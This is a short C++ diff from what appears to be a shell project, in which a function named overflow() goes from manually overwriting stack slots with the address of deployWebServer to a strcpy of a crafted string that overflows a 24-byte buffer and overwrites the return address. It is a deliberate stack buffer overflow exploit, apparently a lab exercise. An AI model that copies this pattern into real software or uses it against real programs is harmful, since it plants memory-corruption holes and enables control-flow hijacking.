@@ -18,25 +18,11 @@ using namespace std;
 Shell* const aggieshell = new Shell{};
 
 static void overflow() {
-    char buf[24] = {0};
-    int* buf_int = (int*)buf;
-    printf("%p\n\n\n", deployWebServer);
-    // sprintf(buf, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHII%u", (unsigned int)deployWebServer);
-    buf_int[8] = 0xDEADBEEF;
-    buf_int[9] = (uint32_t)deployWebServer;
-    // buf_int[40] = 0x69696969;
-    for (int i = 0; i < 100; i+=4) printf("[%d]\t0x%08X\n", i, *((int*)(&buf[i])));
-
-    // printf("setting up the overflow\n");
-
-    // exit(-69);
-    // strcpy(buf, "AAAABBBBCCCCDDDDEEEEFFFFGGGG\x00\x00\x9c\x18HHHHIIII");
-    // return;
-    buf_int[8] = (uint32_t)deployWebServer;
-    buf_int[9] = (uint32_t)deployWebServer;
-    buf_int[10] = (uint32_t)deployWebServer;
-
-    // for (int i = 0; i < 120; i++) buf_int[i] = (uint32_t)deployWebServer;
+    char buf[24];
+    //strcpy(buf, "AAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF");
+    //08055160
+    strcpy(buf, "AAAAAAAAAAAAAAAAAAAAAAAABBBB\x64\x51\x05\x08");
+    //deployWebServer();
 }
 
 static void quit_handler(int signo) {
